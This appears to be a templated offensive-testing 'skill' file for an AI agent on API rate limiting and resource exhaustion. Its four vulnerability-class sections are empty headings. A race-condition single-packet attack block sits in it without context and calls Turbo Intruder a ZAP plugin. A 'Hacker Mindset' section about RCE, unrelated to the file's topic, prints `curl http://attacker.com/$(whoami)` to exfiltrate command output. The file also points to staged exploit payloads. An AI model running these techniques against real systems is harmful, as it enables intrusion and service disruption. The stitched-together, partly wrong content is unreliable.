---

name: api-23-resource-limits
sequence: api-23
category: misc
domain: api
description: "API rate limiting and resource exhaustion testing skill. Covers rate limit bypass, resource exhaustion, pagination abuse, batch endpoint abuse, and denial-of-service via API resource consumption. Use when testing API rate limiting and resource controls."
wordlist_ref: "wordlists/api/api-19-security-misconfig/"
---

# API Rate Limiting & Resource Exhaustion — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for Unrestricted Resource Consumption — missing or bypassable rate limits, pagination
abuse, no maximum payload sizes, lack of query complexity limits, and API endpoints that
can be abused to cause financial cost or service degradation per OWASP API4:2023.

## OWASP API Mapping
- API4:2023 Unrestricted Resource Consumption
- CWE-770: Allocation of Resources Without Limits or Throttling
- CWE-400: Uncontrolled Resource Consumption

# Turbo Intruder single-packet attack (most precise timing):
# 1. Send 9 requests with same body, hold connection open
# 2. Send 10th request (the trigger) with final byte
# 3. All 10 requests arrive at server within same millisecond
# 4. If server processes non-atomically → all 10 succeed
# Real-world impact: Two accounts with same username → account confusion, privilege escalation
# Technique: Send all request headers first, then final byte of all requests simultaneously
# This minimizes server-side processing delay between requests to near-zero
# Using Turbo Intruder (ZAP plugin) or custom implementation:
# 1. Open N connections to server
# 2. Send all headers (Content-Length includes final byte)
# 3. Hold connections open
# 4. Send final byte of ALL requests at once
# 5. Server receives all requests within same processing cycle
# This is the most reliable race condition technique because:
# - Network delay variation is eliminated
# - Server processes all requests in same scheduling window
# - Atomic operations that check-then-act are most vulnerable
## Vulnerability Classes

### 1. Missing Rate Limiting on Sensitive Endpoints


### 2. Rate Limit Bypass Techniques


### 3. Pagination Abuse (Unrestricted Data Fetching)


### 4. GraphQL Query Complexity (DoS)




## Hacker Mindset

**RCE is the destination, not the starting point.** You usually get there through a chain: SQLi → shell, SSTI → shell, file upload → shell. Each link in the chain is a distinct finding.

**OOB is how you prove blind RCE.** `curl http://attacker.com/$(whoami)` sends a DNS lookup and HTTP request that proves command execution even if no output is returned.

**Simple commands first.** `whoami`, `id`, `hostname`, `sleep 5`. Don't start with destructive commands.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates

## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/api/api-19-security-misconfig/`

**Files**:
- `wordlists/api/api-19-security-misconfig/payloads/api_paths/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

